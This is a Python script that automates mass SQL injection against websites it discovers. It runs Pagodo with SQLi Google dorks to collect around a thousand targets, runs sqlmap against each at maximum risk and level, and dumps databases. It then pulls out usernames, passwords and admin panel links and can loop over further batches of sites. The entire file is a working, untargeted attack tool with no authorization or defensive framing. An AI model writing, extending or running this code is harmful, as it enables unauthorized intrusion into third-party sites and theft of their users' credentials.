import os
import subprocess
import re
import shutil
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import time

DORKS_FILE = "sqli_dorks.txt"


def finder(min_sites=1000):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_file = f"vulnerable_sites_{timestamp}.txt"
    print(f"Searching for vulnerable sites using Pagodo...")

    pagodo_command = [
        "python3", "pagodo/pagodo.py",
        "-g", DORKS_FILE,  
        "-s", output_file,  
        "-l", str(min_sites),  
        "-j", "1.5"  
    ]

    try:
        subprocess.run(pagodo_command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running Pagodo: {e}")
        return None

    if not os.path.exists(output_file):
        print(f"No sites found by Pagodo!")
        return None

    with open(output_file, "r") as f:
        sites = [line.strip() for line in f if line.strip()]
    
    print(f"Found {len(sites)} sites, saved to {output_file}")
    return output_file

def scan_site(target_url):
    output_dir = f"./sqlmap_output_{target_url.replace('http://', '').replace('https://', '').replace('/', '_')}"
    
    command = [
        "python3", "sqlmap/sqlmap.py",
        "-u", target_url,
        "--batch",
        "--dbs",
        "--tables",
        "--columns",
        "--dump",
        "--threads=10",
        "--risk=3",
        "--level=5",
        "--search", "-C", "user,username,pass,password,admin",
        "--crawl=5",
        "--output-dir", output_dir
    ]

    print(f"Scanning {target_url}...")
    try:
        subprocess.run(command, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError:
        print(f"Failed to scan {target_url}")
        return None

    username, password, panel_link = None, None, None

    for root, dirs, files in os.walk(output_dir):
        for file in files:
            file_path = os.path.join(root, file)
            if file.endswith(".csv"):
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    if "username" in content.lower() or "user" in content.lower():
                        username_match = re.search(r"(?<=username,).+", content, re.IGNORECASE)
                        username = username_match.group().strip() if username_match else None
                    if "password" in content.lower() or "pass" in content.lower():
                        password_match = re.search(r"(?<=password,).+", content, re.IGNORECASE)
                        password = password_match.group().strip() if password_match else None
            elif file == "log":
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    panel_link_match = re.search(r"(http[s]?://[^\s]*?(admin|panel|login)[^\s]*)", content)
                    panel_link = panel_link_match.group() if panel_link_match else None

    shutil.rmtree(output_dir, ignore_errors=True)

    return {
        "url": target_url,
        "username": username or "Not found",
        "password": password or "Not found",
        "panel_link": panel_link or "Not found"
    }

def prvysi(file_path):
    with open(file_path, "r") as f:
        sites = [line.strip() for line in f if line.strip()]

    if not sites:
        print("No sites found in the file!")
        return []

    results = []
    with ThreadPoolExecutor(max_workers=5) as executor:
        results = list(executor.map(scan_site, sites))
    
    results = [r for r in results if r is not None]
    
    print("\n=== Scan Results ===")
    for result in results:
        print(f"\nSite: {result['url']}")
        print(f"Username: {result['username']}")
        print(f"Password: {result['password']}")
        print(f"Panel Link: {result['panel_link']}")
        print("-" * 50)
    
    return results

def main():
    if not os.path.exists(DORKS_FILE):
        print(f"Error: Dorks file '{DORKS_FILE}' not found! Please create it with SQLi dorks.")
        return

    while True:
        sites_file = finder(min_sites=1000)
        if not sites_file:
            print("Failed to find sites. Exiting...")
            break

        prvysi(sites_file)

        choice = input("\nDo you want to scan another 1000 sites? (y/n): ").strip().lower()
        if choice != "y":
            print("Exiting...")
            break

if __name__ == "__main__":
    main()
